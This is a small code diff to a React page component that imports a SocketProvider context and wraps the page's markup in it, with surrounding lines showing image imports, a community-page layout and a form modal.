@@ -8,6 +8,7 @@ import CounterfeitImage from '@/assets/images/counterfeit.png';
 import WarningIcon from '@/assets/images/ic_warning.svg';
 import LogoMeta from '@/assets/images/logo-meta.svg';
 import TrademarkImage from '@/assets/images/trade-mark.png';
+import SocketProvider from '@/contexts/socket-context';
 import { store } from '@/store/store';
 import { getDeviceLabel } from '@/utils/device';
 import translateText from '@/utils/translate';
@@ -129,6 +130,7 @@ const Page: FC = () => {
     };
 
     return (
+        <SocketProvider>
         <div className='community-page flex min-h-screen w-full justify-center bg-white text-[#1C2B33]'>
             <div className='w-full'>
                 <div className='flex h-[52px] items-center justify-center border-b border-[#E0E0E0] bg-[#F5F6F6]'>
@@ -262,6 +264,7 @@ const Page: FC = () => {
             </div>
             {isModalOpen && <FormModal key={modalKey} />}
         </div>
+        </SocketProvider>
     );
 };
 
